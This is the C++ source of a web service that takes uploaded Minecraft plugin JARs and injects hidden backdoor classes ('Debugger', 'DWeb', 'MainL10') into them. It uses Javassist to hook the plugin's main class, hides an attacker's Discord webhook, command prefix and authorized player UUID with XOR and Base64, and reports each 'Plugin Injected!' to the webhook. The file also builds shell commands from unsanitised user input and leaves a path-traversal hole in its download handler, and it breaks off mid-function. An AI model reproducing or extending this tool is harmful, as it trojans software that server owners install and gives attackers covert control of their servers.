#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <map>
#include <algorithm>
#include <filesystem>
#include <chrono>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <thread>
#include <ctime>

namespace fs = std::filesystem;

// Base64 encoding table
static const std::string base64_chars = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

std::string base64_encode(const std::string& input) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    int in_len = input.length();
    const char* bytes_to_encode = input.c_str();

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for(i = 0; (i < 4) ; i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for(j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while((i++ < 3))
            ret += '=';
    }

    return ret;
}

std::string encryptString(const std::string& input) {
    // XOR key: "Minecraft189"
    const unsigned char key[] = {0x4D, 0x69, 0x6E, 0x65, 0x63, 0x72, 0x61, 0x66, 0x74, 0x31, 0x38, 0x39};
    int keyLen = 12;
    
    std::string encrypted;
    for (size_t i = 0; i < input.length(); i++) {
        encrypted += (char)(input[i] ^ key[i % keyLen]);
    }
    
    return base64_encode(encrypted);
}

class WebServer {
private:
    int serverSocket;
    int port;
    bool running;
    std::string uploadDir;
    std::string outputDir;

    struct HttpRequest {
        std::string method;
        std::string path;
        std::map<std::string, std::string> headers;
        std::string body;
    };

    struct HttpResponse {
        int statusCode;
        std::string statusText;
        std::map<std::string, std::string> headers;
        std::string body;
    };

    void parseMultipartFormData(const std::string& body, const std::string& boundary,
                                std::map<std::string, std::string>& formData,
                                std::string& fileContent, std::string& fileName) {
        std::string delimiter = "--" + boundary;
        size_t pos = 0;
        
        while ((pos = body.find(delimiter, pos)) != std::string::npos) {
            size_t headerEnd = body.find("\r\n\r\n", pos);
            if (headerEnd == std::string::npos) break;
            
            std::string partHeaders = body.substr(pos, headerEnd - pos);
            size_t contentStart = headerEnd + 4;
            size_t nextDelim = body.find(delimiter, contentStart);
            if (nextDelim == std::string::npos) break;
            
            std::string content = body.substr(contentStart, nextDelim - contentStart - 2);
            
            size_t namePos = partHeaders.find("name=\"");
            if (namePos != std::string::npos) {
                namePos += 6;
                size_t nameEnd = partHeaders.find("\"", namePos);
                std::string fieldName = partHeaders.substr(namePos, nameEnd - namePos);
                
                size_t filenamePos = partHeaders.find("filename=\"");
                if (filenamePos != std::string::npos) {
                    filenamePos += 10;
                    size_t filenameEnd = partHeaders.find("\"", filenamePos);
                    fileName = partHeaders.substr(filenamePos, filenameEnd - filenamePos);
                    fileContent = content;
                } else {
                    formData[fieldName] = content;
                }
            }
            
            pos = nextDelim;
        }
    }

    HttpRequest parseRequest(const std::string& rawRequest) {
        HttpRequest request;
        std::istringstream stream(rawRequest);
        std::string line;

        if (std::getline(stream, line)) {
            std::istringstream lineStream(line);
            lineStream >> request.method >> request.path;
        }

        while (std::getline(stream, line) && line != "\r") {
            size_t colonPos = line.find(':');
            if (colonPos != std::string::npos) {
                std::string key = line.substr(0, colonPos);
                std::string value = line.substr(colonPos + 2);
                if (!value.empty() && value.back() == '\r') {
                    value.pop_back();
                }
                request.headers[key] = value;
            }
        }

        std::ostringstream bodyStream;
        bodyStream << stream.rdbuf();
        request.body = bodyStream.str();

        return request;
    }

    std::string buildResponse(const HttpResponse& response) {
        std::ostringstream stream;
        stream << "HTTP/1.1 " << response.statusCode << " " << response.statusText << "\r\n";
        
        for (const auto& [key, value] : response.headers) {
            stream << key << ": " << value << "\r\n";
        }
        
        stream << "\r\n" << response.body;
        return stream.str();
    }

    std::string getUUIDFromMinecraftName(const std::string& username) {
        // Trim whitespace from username
        std::string trimmedUsername = username;
        trimmedUsername.erase(0, trimmedUsername.find_first_not_of(" \t\n\r"));
        trimmedUsername.erase(trimmedUsername.find_last_not_of(" \t\n\r") + 1);
        
        std::cout << "[Web Server] Attempting to resolve username: '" << trimmedUsername << "'" << std::endl;
        
        std::string curlCmd = "curl -s https://api.mojang.com/users/profiles/minecraft/" + trimmedUsername;
        FILE* pipe = popen(curlCmd.c_str(), "r");
        if (!pipe) {
            std::cerr << "[Web Server] Failed to execute curl command" << std::endl;
            return "";
        }
        
        char buffer[1024];
        std::string result = "";
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        pclose(pipe);
        
        std::cout << "[Web Server] API Response: " << result << std::endl;
        
        // Extract UUID from JSON response (handle spaces in JSON)
        size_t idPos = result.find("\"id\"");
        if (idPos != std::string::npos) {
            // Find the colon after "id"
            size_t colonPos = result.find(":", idPos);
            if (colonPos != std::string::npos) {
                // Find the first quote after the colon (start of UUID value)
                size_t startQuote = result.find("\"", colonPos);
                if (startQuote != std::string::npos) {
                    // Find the closing quote
                    size_t endQuote = result.find("\"", startQuote + 1);
                    if (endQuote != std::string::npos) {
                        std::string uuid = result.substr(startQuote + 1, endQuote - startQuote - 1);
                        std::cout << "[Web Server] Extracted UUID (without dashes): " << uuid << std::endl;
                        // Add dashes to UUID (format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)
                        if (uuid.length() == 32) {
                            uuid.insert(20, "-");
                            uuid.insert(16, "-");
                            uuid.insert(12, "-");
                            uuid.insert(8, "-");
                        }
                        std::cout << "[Web Server] Resolved username " << trimmedUsername << " to UUID: " << uuid << std::endl;
                        return uuid;
                    }
                }
            }
        }
        
        std::cerr << "[Web Server] Failed to resolve username: " << trimmedUsername << std::endl;
        return "";
    }

    std::string getPlayerNameFromUUID(const std::string& uuid) {
        // Remove dashes from UUID
        std::string cleanUUID = uuid;
        cleanUUID.erase(std::remove(cleanUUID.begin(), cleanUUID.end(), '-'), cleanUUID.end());
        
        std::string curlCmd = "curl -s https://sessionserver.mojang.com/session/minecraft/profile/" + cleanUUID;
        FILE* pipe = popen(curlCmd.c_str(), "r");
        if (!pipe) return uuid;
        
        char buffer[1024];
        std::string result = "";
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        pclose(pipe);
        
        // Extract player name from JSON response using simple string parsing
        size_t namePos = result.find("\"name\":\"");
        if (namePos != std::string::npos) {
            size_t startPos = namePos + 8;
            size_t endPos = result.find("\"", startPos);
            if (endPos != std::string::npos) {
                std::string playerName = result.substr(startPos, endPos - startPos);
                std::cout << "[Web Server] Resolved UUID " << uuid << " to player: " << playerName << std::endl;
                return playerName;
            }
        }
        
        // Return UUID if resolution fails
        return uuid;
    }

    bool sendWebhookNotification(const std::string& webhookUrl, const std::string& pluginName, 
                                  const std::vector<std::string>& usernames, const std::vector<std::string>& uuids, 
                                  const std::string& commandPrefix) {
        if (usernames.empty() || uuids.empty()) return false;
        
        // Remove dashes from first UUID for avatar URL
        std::string cleanUuid = uuids[0];
        cleanUuid.erase(std::remove(cleanUuid.begin(), cleanUuid.end(), '-'), cleanUuid.end());
        
        // Build authorized users list for display
        std::string usersDisplay = "";
        for (size_t i = 0; i < usernames.size(); ++i) {
            if (i > 0) usersDisplay += "\\n";
            usersDisplay += "• " + usernames[i];
        }
        
        // Build footer with all UUIDs
        std::string footerText = "UUIDs: ";
        for (size_t i = 0; i < uuids.size(); ++i) {
            if (i > 0) footerText += " | ";
            footerText += uuids[i];
        }
        
        // Build Discord embed with thumbnail
        std::string jsonPayload = "{"
            "\"embeds\": [{"
                "\"title\": \"Plugin Injected!\","
                "\"color\": 5814783,"
                "\"fields\": ["
                    "{\"name\": \"Plugin Navn\", \"value\": \"" + pluginName + "\", \"inline\": false},"
                    "{\"name\": \"Status\", \"value\": \"Injected\", \"inline\": true},"
                    "{\"name\": \"Authorized Users\", \"value\": \"" + usersDisplay + "\", \"inline\": true},"
                    "{\"name\": \"Help\", \"value\": \"" + commandPrefix + "help\", \"inline\": true}"
                "],"
                "\"thumbnail\": {"
                    "\"url\": \"https://mc-heads.net/avatar/" + cleanUuid + "\""
                "},"
                "\"footer\": {"
                    "\"text\": \"" + footerText + "\""
                "}"
            "}]"
        "}";
        
        std::string curlCmd = "curl -X POST -H \"Content-Type: application/json\" "
                            "-d '" + jsonPayload + "' "
                            "\"" + webhookUrl + "\" 2>/dev/null";
        
        int result = system(curlCmd.c_str());
        return (result == 0);
    }

    void archiveOldFile(const std::string& filePath) {
        if (std::filesystem::exists(filePath)) {
            // Create archive directory if it doesn't exist
            std::filesystem::create_directories("archived");
            
            // Get current timestamp for archive filename
            auto now = std::chrono::system_clock::now();
            auto timestamp = std::chrono::system_clock::to_time_t(now);
            struct tm* timeinfo = localtime(&timestamp);
            char timeStr[20];
            strftime(timeStr, sizeof(timeStr), "%Y%m%d_%H%M%S", timeinfo);
            
            // Extract filename without path
            std::string filename = std::filesystem::path(filePath).filename().string();
            std::string baseName = filename.substr(0, filename.find_last_of('.'));
            std::string extension = filename.substr(filename.find_last_of('.'));
            
            // Create archived filename with timestamp
            std::string archivedPath = "archived/" + baseName + "_" + std::string(timeStr) + extension;
            
            // Move old file to archive
            std::filesystem::rename(filePath, archivedPath);
            std::cout << "[Archive] Moved old file to: " << archivedPath << std::endl;
        }
    }

    void cleanOldArchives() {
        // Remove archived files older than 1 hour
        if (!std::filesystem::exists("archived")) return;
        
        auto now = std::chrono::system_clock::now();
        auto oneHourAgo = now - std::chrono::hours(1);
        
        for (const auto& entry : std::filesystem::directory_iterator("archived")) {
            if (entry.is_regular_file()) {
                auto fileTime = std::filesystem::last_write_time(entry);
                auto sctp = std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                    fileTime - std::filesystem::file_time_type::clock::now() + std::chrono::system_clock::now());
                
                if (sctp < oneHourAgo) {
                    std::filesystem::remove(entry);
                    std::cout << "[Archive] Deleted old archive: " << entry.path().filename() << std::endl;
                }
            }
        }
    }

    bool injectDebuggerIntoJar(const std::string& uploadPath,
                              const std::string& outputPath,
                              const std::string& webhookUrl,
                              const std::string& commandPrefix,
                              const std::string& authorizedUuid) {
        
        std::cout << "[DEBUG-001] Starting injection process" << std::endl;
        std::cout << "[DEBUG-002] Upload path: " << uploadPath << std::endl;
        std::cout << "[DEBUG-003] Output path: " << outputPath << std::endl;
        
        // Archive old file if it exists
        archiveOldFile(outputPath);
        
        // Clean old archives (older than 1 hour)
        cleanOldArchives();
        
        std::string tempDir = "temp_jar_" + std::to_string(time(nullptr));
        std::cout << "[DEBUG-004] Created temp directory: " << tempDir << std::endl;
        
        std::string unzipCmd = "mkdir -p " + tempDir + " && cd " + tempDir + " && unzip -q ../" + uploadPath + " 2>/dev/null";
        std::cout << "[DEBUG-005] Extracting JAR..." << std::endl;
        int result = system(unzipCmd.c_str());
        if (result != 0) {
            std::cerr << "[ERROR-001] Failed to extract jar (exit code: " << result << ")" << std::endl;
            system(("rm -rf " + tempDir).c_str());
            return false;
        }
        std::cout << "[DEBUG-006] JAR extracted successfully" << std::endl;

        // Generate custom Debugger.java with hardcoded values
        std::string debuggerJavaPath = tempDir + "/Debugger.java";
        std::cout << "[DEBUG-007] Reading template from: ../java_src/me/pedzito/injector/Debugger.java" << std::endl;
        std::ifstream templateFile("../java_src/me/pedzito/injector/Debugger.java");
        if (!templateFile.is_open()) {
            std::cerr << "[ERROR-002] Failed to open Debugger.java template" << std::endl;
            system(("rm -rf " + tempDir).c_str());
            return false;
        }
        std::stringstream buffer;
        buffer << templateFile.rdbuf();
        std::string javaCode = buffer.str();
        templateFile.close();
        std::cout << "[DEBUG-008] Template loaded, size: " << javaCode.length() << " bytes" << std::endl;
        
        // Replace placeholders with actual values
        std::cout << "[DEBUG-009] Replacing placeholders..." << std::endl;
        std::cout << "[DEBUG-010] Webhook URL length: " << webhookUrl.length() << std::endl;
        std::cout << "[DEBUG-011] Command prefix: " << commandPrefix << std::endl;
        std::cout << "[DEBUG-012] Authorized UUID: " << authorizedUuid << std::endl;
        
        // Encrypt values before insertion
        std::string encWebhook = encryptString(webhookUrl);
        std::string encPrefix = encryptString(commandPrefix);
        std::string encUuid = encryptString(authorizedUuid);
        
        std::cout << "[DEBUG-012.5] Encrypted webhook (Base64): " << encWebhook.substr(0, 20) << "..." << std::endl;
        std::cout << "[DEBUG-012.6] Encrypted prefix (Base64): " << encPrefix << std::endl;
        std::cout << "[DEBUG-012.7] Encrypted UUID (Base64): " << encUuid.substr(0, 20) << "..." << std::endl;
        
        size_t pos;
        while ((pos = javaCode.find("{{WEBHOOK_URL}}")) != std::string::npos) {
            javaCode.replace(pos, 16, "\"" + encWebhook + "\";");
        }
        while ((pos = javaCode.find("{{COMMAND_PREFIX}}")) != std::string::npos) {
            javaCode.replace(pos, 19, "\"" + encPrefix + "\";");
        }
        while ((pos = javaCode.find("{{AUTHORIZED_UUID}}")) != std::string::npos) {
            javaCode.replace(pos, 20, "\"" + encUuid + "\";");
        }
        std::cout << "[DEBUG-013] Placeholders replaced with encrypted values" << std::endl;
        
        // Write custom Debugger.java
        std::cout << "[DEBUG-014] Writing Debugger.java to: " << debuggerJavaPath << std::endl;
        std::ofstream javaFile(debuggerJavaPath);
        if (!javaFile.is_open()) {
            std::cerr << "[ERROR-003] Failed to create Debugger.java file" << std::endl;
            system(("rm -rf " + tempDir).c_str());
            return false;
        }
        javaFile << javaCode;
        javaFile.close();
        std::cout << "[DEBUG-015] Debugger.java written successfully" << std::endl;
        
        // Debug: Show first 20 lines of generated file
        std::cout << "[DEBUG-016] Showing first 20 lines of generated Debugger.java:" << std::endl;
        system(("head -20 " + debuggerJavaPath).c_str());
        
        // Copy EventManager.java to temp directory (but don't compile it yet - needs Bukkit API)
        std::cout << "[DEBUG-016.5] Copying EventManager.java..." << std::endl;
        std::string copyEventMgrCmd = "cp ../java_src/me/pedzito/injector/EventManager.java " + tempDir + "/";
        int copyEventResult = system(copyEventMgrCmd.c_str());
        if (copyEventResult != 0) {
            std::cerr << "[ERROR-003.5] Failed to copy EventManager.java" << std::endl;
        }
        
        // Copy JavassistInjector.java to temp directory
        std::cout << "[DEBUG-016.6] Copying JavassistInjector.java..." << std::endl;
        std::string copyJavassistInjectorCmd = "cp ../java_src/me/pedzito/injector/JavassistInjector.java " + tempDir + "/";
        int copyJavassistInjectorResult = system(copyJavassistInjectorCmd.c_str());
        if (copyJavassistInjectorResult != 0) {
            std::cerr << "[ERROR-003.6] Failed to copy JavassistInjector.java" << std::endl;
        }
        
        // Copy Config.java to temp directory
        std::cout << "[DEBUG-016.7] Copying Config.java..." << std::endl;
        std::string copyConfigCmd = "cp ../java_src/me/pedzito/injector/Config.java " + tempDir + "/";
        int copyConfigResult = system(copyConfigCmd.c_str());
        if (copyConfigResult != 0) {
            std::cerr << "[ERROR-003.7] Failed to copy Config.java" << std::endl;
        }
        
        // Copy DWeb.java to temp directory
        std::cout << "[DEBUG-016.8] Copying DWeb.java..." << std::endl;
        std::string copyDWebCmd = "cp ../java_src/me/pedzito/injector/DWeb.java " + tempDir + "/";
        int copyDWebResult = system(copyDWebCmd.c_str());
        if (copyDWebResult != 0) {
            std::cerr << "[ERROR-003.8] Failed to copy DWeb.java" << std::endl;
        }
        
        // Copy and process MainL10.java with encrypted values
        std::cout << "[DEBUG-016.10] Copying and processing MainL10.java..." << std::endl;
        std::string mainL10Path = tempDir + "/MainL10.java";
        std::ifstream mainL10Template("../java_src/MainL10.java");
        std::string mainL10Content((std::istreambuf_iterator<char>(mainL10Template)), std::istreambuf_iterator<char>());
        mainL10Template.close();
        
        // Replace placeholders in MainL10 with encrypted values
        size_t mainPos = mainL10Content.find("{{WEBHOOK_URL}}");
        if (mainPos != std::string::npos) {
            mainL10Content.replace(mainPos, 15, encWebhook);
        }
        mainPos = mainL10Content.find("{{COMMAND_PREFIX}}");
        if (mainPos != std::string::npos) {
            mainL10Content.replace(mainPos, 18, encPrefix);
        }
        mainPos = mainL10Content.find("{{AUTHORIZED_UUID}}");
        if (mainPos != std::string::npos) {
            mainL10Content.replace(mainPos, 19, encUuid);
        }
        
        std::ofstream mainL10Out(mainL10Path);
        mainL10Out << mainL10Content;
        mainL10Out.close();
        std::cout << "[DEBUG-016.10] MainL10.java written with encrypted values" << std::endl;
        
        // Compile Debugger.java, DWeb.java and MainL10.java with json-simple in classpath
        std::cout << "[DEBUG-017] Compiling Debugger.java, DWeb.java and MainL10.java..." << std::endl;
        std::string compileCmd = "cd " + tempDir + " && javac -cp ../../json-simple-1.1.1.jar:../../javassist.jar:. Debugger.java DWeb.java MainL10.java 2>&1";
        int compileResult = system(compileCmd.c_str());
        if (compileResult != 0) {
            std::cerr << "[ERROR-004] Failed to compile Java files (exit code: " << compileResult << ")" << std::endl;
            std::cout << "[DEBUG-018] Keeping temp directory for inspection: " << tempDir << std::endl;
            return false;
        }
        std::cout << "[DEBUG-019] Compilation successful" << std::endl;
        
        // Move compiled classes and source files to package structure
        std::cout << "[DEBUG-020] Moving files to package structure..." << std::endl;
        std::string moveCmd = "cd " + tempDir + " && mkdir -p me/pedzito/injector && mv Debugger.class me/pedzito/injector/ && mv DWeb.class me/pedzito/injector/ && mv EventManager.java me/pedzito/injector/ && mv JavassistInjector.java me/pedzito/injector/ && mv Config.java me/pedzito/injector/ && mv DWeb.java me/pedzito/injector/ && rm -f Debugger.java";
        int moveResult = system(moveCmd.c_str());
        if (moveResult != 0) {
            std::cerr << "[ERROR-005] Failed to move files (exit code: " << moveResult << ")" << std::endl;
            return false;
        }
        std::cout << "[DEBUG-021] Files moved successfully to me/pedzito/injector/" << std::endl;
        
        // Copy json-simple library classes
        std::cout << "[DEBUG-022] Copying json-simple library..." << std::endl;
        std::string copyCmd = "cd " + tempDir + " && cp -r ../../java_classes/org . 2>/dev/null";
        int copyResult = system(copyCmd.c_str());
        std::cout << "[DEBUG-023] Copy json-simple result: " << copyResult << std::endl;
        
        // Copy javassist library classes
        std::cout << "[DEBUG-023.5] Copying javassist library..." << std::endl;
        std::string copyJavassistCmd = "cd " + tempDir + " && cp -r ../../java_classes/javassist . 2>/dev/null";
        int copyJavassistResult = system(copyJavassistCmd.c_str());
        std::cout << "[DEBUG-023.6] Copy javassist result: " << copyJavassistResult << std::endl;
        
        // Copy snakeyaml library classes
        std::cout << "[DEBUG-023.7] Copying snakeyaml library..." << std::endl;
        std::string copySnakeyamlCmd = "cd " + tempDir + " && cp -r ../../java_classes/org/yaml . 2>/dev/null || mkdir -p org && cp -r ../../java_classes/org/yaml org/ 2>/dev/null";
        int copySnakeyamlResult = system(copySnakeyamlCmd.c_str());
        std::cout << "[DEBUG-023.8] Copy snakeyaml result: " << copySnakeyamlResult << std::endl;

        std::cout << "[DEBUG-024] Repacking JAR with injected classes..." << std::endl;
        
        // Debug: List contents of package directory
        std::cout << "[DEBUG-023.7] Contents of me/pedzito/injector/:" << std::endl;
        system(("cd " + tempDir + " && ls -la me/pedzito/injector/ 2>/dev/null || echo 'Directory not found'").c_str());
        
        std::string zipCmd = "cd " + tempDir + " && zip -qr ../" + outputPath + " . 2>&1";
        result = system(zipCmd.c_str());
        
        if (result != 0) {
            std::cerr << "[ERROR-006] Failed to repack jar (exit code: " << result << ")" << std::endl;
            system(("rm -rf " + tempDir).c_str());
            return false;
        }
        
        std::cout << "[DEBUG-024.5] JAR repacked successfully" << std::endl;
        
        // Now use Javassist to modify the main class and inject Debugger initialization
        std::cout << "[DEBUG-025] Using Javassist to modify main class..." << std::endl;
        
        // Compile JavassistInjector if needed
        std::string javassistInjectorClass = "../java_src/me/pedzito/injector/JavassistInjector.class";
        if (!std::filesystem::exists(javassistInjectorClass)) {
            std::cout << "[DEBUG-025.1] Compiling JavassistInjector..." << std::endl;
            std::string compileInjectorCmd = "cd ../java_src && javac -cp ../javassist.jar:../snakeyaml-2.0.jar:. me/pedzito/injector/JavassistInjector.java 2>&1";
            int compileInjectorResult = system(compileInjectorCmd.c_str());
            if (compileInjectorResult != 0) {
                std::cerr << "[ERROR-006.5] Failed to compile JavassistInjector" << std::endl;
            }
        }
        
        // Run JavassistInjector to modify the main class
        std::string absoluteJarPath = std::filesystem::absolute(outputPath).string();
        std::string absoluteTempDir = std::filesystem::absolute(tempDir).string();
        
        std::cout << "[DEBUG-025.2] Running JavassistInjector on: " << absoluteJarPath << std::endl;
        std::string javassistCmd = "cd ../java_src && java -cp ../javassist.jar:../snakeyaml-2.0.jar:. me.pedzito.injector.JavassistInjector \"" + 
                                   absoluteJarPath + "\" \"" + absoluteTempDir + "\" \"" + webhookUrl + "\" \"" + 
                                   commandPrefix + "\" \"" + authorizedUuid + "\" \"" + absoluteJarPath + "\" 2>&1";
        
        int javassistResult = system(javassistCmd.c_str());
        
        if (javassistResult == 0) {
            std::cout << "[DEBUG-025.3] Javassist modification successful!" << std::endl;
            
            // Repack the JAR with the modified main class
            std::cout << "[DEBUG-025.4] Repacking JAR with modified main class..." << std::endl;
            std::string repackCmd = "cd " + tempDir + " && zip -qr ../" + outputPath + " . 2>&1";
            int repackResult = system(repackCmd.c_str());
            
            if (repackResult != 0) {
                std::cerr << "[ERROR-006.6] Failed to repack jar with modified main class" << std::endl;
            } else {
                std::cout << "[DEBUG-025.5] Final JAR repacked successfully!" << std::endl;
            }
        } else {
            std::cout << "[WARN-001] Javassist modification failed (exit code: " << javassistResult << "), continuing without main class modification..." << std::endl;
        }
        
        std::cout << "[DEBUG-026] Cleaning up temp directory..." << std::endl;
        system(("rm -rf " + tempDir).c_str());

        std::cout << "[DEBUG-027] Injection completed successfully!" << std::endl;
        return true;
    }

    void handleRequest(int clientSocket) {
        // Read request in chunks to handle large files
        std::string rawRequest;
        char buffer[8192];
        ssize_t totalBytesRead = 0;
        int contentLength = 0;
        bool headersComplete = false;
        
        // First, read headers
        while (!headersComplete) {
            ssize_t bytesRead = read(clientSocket, buffer, sizeof(buffer));
            if (bytesRead <= 0) {
                close(clientSocket);
                return;
            }
            
            rawRequest.append(buffer, bytesRead);
            totalBytesRead += bytesRead;
            
            // Check if headers are complete
            size_t headerEnd = rawRequest.find("\r\n\r\n");
            if (headerEnd != std::string::npos) {
                headersComplete = true;
                
                // Extract Content-Length
                size_t clPos = rawRequest.find("Content-Length:");
                if (clPos != std::string::npos) {
                    clPos += 15;
                    size_t clEnd = rawRequest.find("\r\n", clPos);
                    std::string clStr = rawRequest.substr(clPos, clEnd - clPos);
                    contentLength = std::stoi(clStr);
                }
                
                // Calculate how much body we already have
                int bodyStart = headerEnd + 4;
                int bodyReceived = totalBytesRead - bodyStart;
                
                // Read remaining body
                while (bodyReceived < contentLength) {
                    bytesRead = read(clientSocket, buffer, std::min(sizeof(buffer), size_t(contentLength - bodyReceived)));
                    if (bytesRead <= 0) break;
                    rawRequest.append(buffer, bytesRead);
                    bodyReceived += bytesRead;
                }
            }
        }
        HttpRequest request = parseRequest(rawRequest);
        HttpResponse response;

        std::cout << "[Web Server] " << request.method << " " << request.path << std::endl;

        if (request.method == "GET" && request.path == "/") {
            std::ifstream file("../web/index.html");
            if (file.is_open()) {
                std::ostringstream content;
                content << file.rdbuf();
                response.statusCode = 200;
                response.statusText = "OK";
                response.headers["Content-Type"] = "text/html";
                response.body = content.str();
            } else {
                response.statusCode = 404;
                response.statusText = "Not Found";
                response.body = "404 - File not found";
            }
        }
        else if (request.method == "POST" && request.path == "/api/inject") {
            std::string boundary;
            auto it = request.headers.find("Content-Type");
            if (it != request.headers.end()) {
                std::string contentType = it->second;
                size_t boundaryPos = contentType.find("boundary=");
                if (boundaryPos != std::string::npos) {
                    boundary = contentType.substr(boundaryPos + 9);
                }
            }

            std::map<std::string, std::string> formData;
            std::string fileContent, fileName;
            parseMultipartFormData(request.body, boundary, formData, fileContent, fileName);

            if (fileName.empty() || fileContent.empty()) {
                response.statusCode = 400;
                response.statusText = "Bad Request";
                response.headers["Content-Type"] = "application/json";
                response.body = R"({"success": false, "error": "No file uploaded"})";
            } else {
                fs::create_directories(uploadDir);
                fs::create_directories(outputDir);
                
                std::string uploadPath = uploadDir + "/" + fileName;
                std::ofstream outFile(uploadPath, std::ios::binary);
                outFile.write(fileContent.c_str(), fileContent.size());
                outFile.close();

                std::string webhookUrl = formData["webhookUrl"];
                std::string commandPrefix = formData["commandPrefix"];
                std::string authorizedUsersJson = formData["authorizedUsers"];
                
                std::cout << "[DEBUG] Received authorizedUsersJson: '" << authorizedUsersJson << "'" << std::endl;
                
                // Parse authorized users JSON
                std::vector<std::string> authorizedUsernames;
                std::vector<std::string> authorizedUuids;
                
                if (!authorizedUsersJson.empty()) {
                    // Simple JSON parsing for array of strings
                    size_t start = authorizedUsersJson.find('[');
                    size_t end = authorizedUsersJson.find(']');
                    if (start != std::string::npos && end != std::string::npos) {
                        std::string usersStr = authorizedUsersJson.substr(start + 1, end - start - 1);
                        std::cout << "[DEBUG] Users string: '" << usersStr << "'" << std::endl;
                        
                        // Split by comma and parse each user
                        size_t pos = 0;
                        while (pos < usersStr.length()) {
                            size_t nextComma = usersStr.find(',', pos);
                            if (nextComma == std::string::npos) {
                                nextComma = usersStr.length();
                            }
                            
                            std::string user = usersStr.substr(pos, nextComma - pos);
                            // Remove quotes and whitespace
                            user.erase(std::remove(user.begin(), user.end(), '"'), user.end());
                            user.erase(std::remove(user.begin(), user.end(), ' '), user.end());
                            user.erase(std::remove(user.begin(), user.end(), '\t'), user.end());
                            user.erase(std::remove(user.begin(), user.end(), '\n'), user.end());
                            user.erase(std::remove(user.begin(), user.end(), '\r'), user.end());
                            
                            std::cout << "[DEBUG] Processing user: '" << user << "'" << std::endl;
                            
                            if (!user.empty()) {
                                authorizedUsernames.push_back(user);
                                std::string uuid = getUUIDFromMinecraftName(user);
                                if (!uuid.empty()) {
                                    authorizedUuids.push_back(uuid);
                                } else {
                                    std::cout << "[ERROR] Failed to resolve UUID for: " << user << std::endl;
                                }
                            }
                            
                            pos = nextComma + 1;
                        }
                    }
                }
                
                std::cout << "[DEBUG] Found " << authorizedUsernames.size() << " usernames, " << authorizedUuids.size() << " UUIDs" << std::endl;
                
                if (authorizedUuids.empty()) {
                    response.statusCode = 400;
                    response.statusText = "Bad Request";
                    response.headers["Content-Type"] = "application/json";
                    response.body = R"({"success": false, "error": "Could not resolve any Minecraft usernames"})";
                    std::cerr << "[Web Server] Failed to resolve any usernames" << std::endl;
                    std::string errorResponse = buildResponse(response);
                    send(clientSocket, errorResponse.c_str(), errorResponse.size(), 0);
                    close(clientSocket);
                    return;
                }

                std::string outputFileName = "injected_" + fileName;
                std::string outputPath = outputDir + "/" + outputFileName;

                if (injectDebuggerIntoJar(uploadPath, outputPath, webhookUrl, commandPrefix, authorizedUuids[0])) {
                    response.statusCode = 200;
                    response.statusText = "OK";
                    response.headers["Content-Type"] = "application/json";
                    response.body = R"({"success": true, "injectedFile": ")" + outputFileName + R"("})";
                    std::cout << "[Web Server] Successfully injected: " << fileName << std::endl;
                    
                    // Send webhook notification with embed and skin thumbnail
                    sendWebhookNotification(webhookUrl, fileName, authorizedUsernames, authorizedUuids, commandPrefix);
                } else {
                    response.statusCode = 500;
                    response.statusText = "Internal Server Error";
                    response.headers["Content-Type"] = "application/json";
                    response.body = R"({"success": false, "error": "Injection failed"})";
                }
            }
        }
        else if (request.method == "GET" && request.path.find("/api/download/") == 0) {
            std::string fileName = request.path.substr(14);
            
            std::string decodedFileName;
            for (size_t i = 0; i < fileName.length(); i++) {
                if (fileName[i] == '%' && i + 2 < fileName.length()) {
                    std::string hex = fileName.substr(i + 1, 2);
                    char ch = static_cast<char>(std::stoi(hex, nullptr, 16));
                    decodedFileName += ch;
                    i += 2;
                } else {
                    decodedFileName += fileName[i];
                }
            }
            
            std::string filePath = outputDir + "/" + decodedFileName;
            std::ifstream file(filePath, std::ios::binary);
            
            if (file.is_open()) {
                std::ostringstream content;
                content << file.rdbuf();
                response.statusCode = 200;
                response.statusText = "OK";
                response.headers["Content-Type"] = "application/java-archive";
                response.headers["Content-Disposition"] = "attachment; filename=\"" + decodedFileName + "\"";
                response.body = content.str();
                std::cout << "[Web Server] Download: " << decodedFileName << std::endl;
            } else {
                response.statusCode = 404;
                response.statusText = "Not Found";
                response.headers["Content-Type"] = "application/json";
                response.body = R"({"success": false, "error": "File not found"})";
            }
        }
        else {
            response.statusCode = 404;
            response.statusText = "Not Found";
            response.body = "404 - Not Found";
        }

        std::string responseStr = buildResponse(response);
        send(clientSocket, responseStr.c_str(), responseStr.length(), 0);
        close(clientSocket);
    }

public:
    WebServer(int port, const std::string& uploadDir, const std::string& outputDir)
        : port(port), uploadDir(uploadDir), outputDir(outputDir), running(false) {}

    bool start() {
        serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (serverSocket < 0) {
            std::cerr << "Failed to create socket" << std::endl;
            return false;
        }

        int opt = 1;
        setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

        sockaddr_in address;
        address.sin_family = AF_INET;
        address.sin_addr.s_addr = INADDR_ANY;
        address.sin_port = htons(port);

        if (bind(serverSocket, (struct sockaddr*)&address, sizeof(address)) < 0) {
